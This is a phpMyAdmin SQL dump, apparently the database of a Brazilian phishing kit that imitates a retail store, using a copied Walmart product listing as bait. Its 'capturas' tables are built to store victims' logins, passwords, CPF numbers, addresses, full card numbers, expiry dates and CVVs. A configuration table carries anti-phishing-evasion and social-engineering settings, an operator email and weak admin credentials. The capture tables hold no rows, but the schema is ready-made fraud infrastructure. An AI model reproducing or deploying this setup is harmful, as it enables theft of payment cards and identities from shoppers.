-- phpMyAdmin SQL Dump
-- version 4.7.3
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3306
-- Generation Time: 04-Fev-2019 às 14:57
-- Versão do servidor: 5.6.40-84.0-log
-- PHP Version: 5.6.30

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `americ53_america`
--

-- --------------------------------------------------------

--
-- Estrutura da tabela `boletos`
--

CREATE TABLE `boletos` (
  `id` int(11) NOT NULL,
  `numero` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  `id_produto` varchar(150) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Extraindo dados da tabela `boletos`
--

INSERT INTO `boletos` (`id`, `numero`, `id_produto`) VALUES
(1, '', '1'),
(2, '', '1'),
(3, '', '1'),
(4, '', '1'),
(5, '', '1');

-- --------------------------------------------------------

--
-- Estrutura da tabela `capturas`
--

CREATE TABLE `capturas` (
  `id` int(11) NOT NULL,
  `usuario` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  `senha` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  `nome` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `cep` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `endereco` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `numero` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `complemento` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `bairro` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `cidade` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `estado` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `ponto` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `apelido` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `cpf` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `titular_cartao` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `cc` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `validade` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `cvv` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `dia` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `ip` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `dispositivo` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `consulta` varchar(300) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Estrutura da tabela `capturas_boleto`
--

CREATE TABLE `capturas_boleto` (
  `id` int(11) NOT NULL,
  `usuario` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  `senha` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  `nome` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `cep` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `endereco` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `numero` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `complemento` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `bairro` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `cidade` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `estado` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `ponto` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `apelido` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `dia` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `ip` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `dispositivo` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `id_produto` varchar(300) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Estrutura da tabela `configuracao`
--

CREATE TABLE `configuracao` (
  `id` int(11) NOT NULL,
  `link_site` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  `email` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  `anti_phising` varchar(2) COLLATE utf8_unicode_ci NOT NULL,
  `alterna` varchar(2) COLLATE utf8_unicode_ci NOT NULL,
  `vencimento` varchar(2) COLLATE utf8_unicode_ci NOT NULL,
  `limite_engenharia` varchar(15) COLLATE utf8_unicode_ci NOT NULL,
  `exibi_preco` varchar(2) COLLATE utf8_unicode_ci NOT NULL,
  `desconto` varchar(2) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Extraindo dados da tabela `configuracao`
--

INSERT INTO `configuracao` (`id`, `link_site`, `email`, `anti_phising`, `alterna`, `vencimento`, `limite_engenharia`, `exibi_preco`, `desconto`) VALUES
(1, 'http://americanasites.com/', 'eziobebidas@gmail.com', '1', '1', '2', 'limit 0,5', '1', '5');

-- --------------------------------------------------------

--
-- Estrutura da tabela `contador_2`
--

CREATE TABLE `contador_2` (
  `id` varchar(15) COLLATE utf8_unicode_ci NOT NULL,
  `visitas` varchar(20) COLLATE utf8_unicode_ci DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Extraindo dados da tabela `contador_2`
--

INSERT INTO `contador_2` (`id`, `visitas`) VALUES
('1', '3');

-- --------------------------------------------------------

--
-- Estrutura da tabela `produtos`
--

CREATE TABLE `produtos` (
  `id` int(11) NOT NULL,
  `url` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  `preco` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  `nome_produto` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `img` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `status_boleto` varchar(300) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Extraindo dados da tabela `produtos`
--

INSERT INTO `produtos` (`id`, `url`, `preco`, `nome_produto`, `img`, `status_boleto`) VALUES
(1, 'https://www.walmart.com.br/conjunto-de-panelas-vermelho-06-pecas-antiaderente/6942864/pr', '50', 'Conjunto de panelas vermelho 06 peÃ§as Antiaderente', '//static.wmobjects.com.br/imgres/arquivos/ids/15385356-344-344/.jpg', '2');

-- --------------------------------------------------------

--
-- Estrutura da tabela `usuarios`
--

CREATE TABLE `usuarios` (
  `login` varchar(15) COLLATE utf8_unicode_ci NOT NULL,
  `senha` varchar(20) COLLATE utf8_unicode_ci DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Extraindo dados da tabela `usuarios`
--

INSERT INTO `usuarios` (`login`, `senha`) VALUES
('admin', '123');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `boletos`
--
ALTER TABLE `boletos`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `capturas`
--
ALTER TABLE `capturas`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `capturas_boleto`
--
ALTER TABLE `capturas_boleto`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `configuracao`
--
ALTER TABLE `configuracao`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `contador_2`
--
ALTER TABLE `contador_2`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `produtos`
--
ALTER TABLE `produtos`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `usuarios`
--
ALTER TABLE `usuarios`
  ADD PRIMARY KEY (`login`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `boletos`
--
ALTER TABLE `boletos`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;
--
-- AUTO_INCREMENT for table `capturas`
--
ALTER TABLE `capturas`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `capturas_boleto`
--
ALTER TABLE `capturas_boleto`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `configuracao`
--
ALTER TABLE `configuracao`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT for table `produtos`
--
ALTER TABLE `produtos`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
